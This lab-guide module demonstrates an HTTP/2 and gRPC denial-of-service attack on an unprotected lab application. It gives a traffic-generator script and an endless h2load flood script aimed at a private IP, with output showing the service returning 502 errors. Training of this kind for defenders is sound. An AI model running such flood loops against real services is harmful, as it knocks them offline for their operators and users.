Module 1 - HTTP/2 and GRPC DoS Attack on Unprotected Application
################################################################

| In this module you will generate **good** and malicious traffic. With the addition of malicious traffic will cause the good traffic to error out. We
| will utilize HTTP/2 and gRPC as part of this module.

Demonstrate the effects of an HTTP/2 and gRPC attacks on an unprotected application
-----------------------------------------------------------------------------------

- Generate legitimate traffic 
   
  - In UDF, Click on Access for the **legitimate traffic** VM and select WebShell 
    We will utilize the good.sh bash script in order to generate HTTP 1 traffic using **curl**, HTTP 2 traffic using **h2load** and using Python3 with route_guide_client to generate gRPC traffic.

.. note:: 
   Excerpt of good.sh bash script 

.. code-block:: bash 

      #!/bin/bash
      cd /grpc/examples/python/route_guide/

      IP=10.1.1.4
      PORT=600
      URI='good_path.html'


      declare -a array=("/#/login" "/#/about" "/assets/public/images/products/apple_pressings.jpg" "/#/search")



      while true; do
      echo
      python3 /grpc/examples/python/route_guide/route_guide_client.py  2>&1 | grep "Finished\|502"
      h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.4:443/testing/ &> /dev/null

      URI=${array[$(( RANDOM % 3 ))]}
      curl -b cookiefile -c cookiefile -L -s -o /dev/null -w "JUICESHOP HTTP Code:%{http_code}\n" -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -H "X-Forwarded-For: 3.3.3.1" http://${IP}:${PORT}/${URI} &
      echo
      URI=${array[$(( RANDOM % 3 ))]}
      curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30" -H "X-Forwarded-For: 3.3.3.2" http://${IP}:${PORT}/${URI} &
      URI=${array[$(( RANDOM % 3 ))]}
      curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" -H "X-Forwarded-For: 3.3.3.3" http://${IP}:${PORT}/${URI} &

   - At the CLI prompt start the good shell script  

.. code-block:: bash 

       ./good.sh
   
    
Output from the script: 

.. code:: shell 
 
   JUICESHOP HTTP Code:200 Finished trip with 10 points

   JUICESHOP HTTP Code:200 Finished trip with 10 points

   JUICESHOP HTTP Code:200 Finished trip with 10 points 

- Start HTTP/2 Flood attack

- Back in the UDF class, click  Access on the **Attacker** VM and select WebShell
  
.. note::  
   http2flood.sh script

.. code-block:: bash 

      #!/bin/sh
      while true; do
      h2load -n 10000 -c 1000 http://10.1.1.4:500/routeguide.RouteGuide/GetFeature
      done


  - At CLI prompt start the HTTP/2 Flood: 

.. code-block:: bash  
   
    ./scripts/http2flood.sh 


Attack script Output

.. code:: shell 

   finished in 1.07s, 9350.31 req/s, 2.09MB/s
  requests: 10000 total, 10000 started, 10000 done, 0 succeeded, 10000 failed, 0 errored, 0 timeout
  status codes: 0 2xx, 0 3xx, 0 4xx, 10000 5xx
  traffic: 2.23MB (2339000) total, 527.34KB (540000) headers (space savings 45.45%), 1.50MB (1570000) data
                       min         max         mean         sd        +/- sd
  time for request:      625us       1.02s     52.83ms     25.29ms    85.84%
  time for connect:     9.42ms     28.08ms     20.14ms      4.61ms    70.10%
  time to 1st byte:    35.60ms       1.04s     96.07ms     66.04ms    99.60%
  req/s           :       9.56       21.66       17.79        1.69    72.90%
  starting benchmark...
  spawning thread #0: 1000 total client(s). 10000 total requests
  Application protocol: h2c
  progress: 10% done
  progress: 20% done
  progress: 30% done
  progress: 40% done
  progress: 50% done
  progress: 60% done
  progress: 70% done
  progress: 80% done
  progress: 90% done
  progress: 100% done

- Click back on to the WebShell on the legitimate VM. Did the output from
   the script change? Output now shows the HTTP/2 service is
   experiencing an outage.

.. code:: shell

  JUICESHOP HTTP Code:200
        details = "Received http2 header with status: 502"
        debug_error_string = "{"created":"@1650395963.222837020","description":"Received http2 :status header with non-200 OK status","file":"src/core/ext/filters/http/client/http_client_filter.cc","file_line":134,"grpc_message":"Received http2 header with status: 502","grpc_status":14,"value":"502"}"

- Stop the HTTP2Flood attack, by pressing Ctrl-C


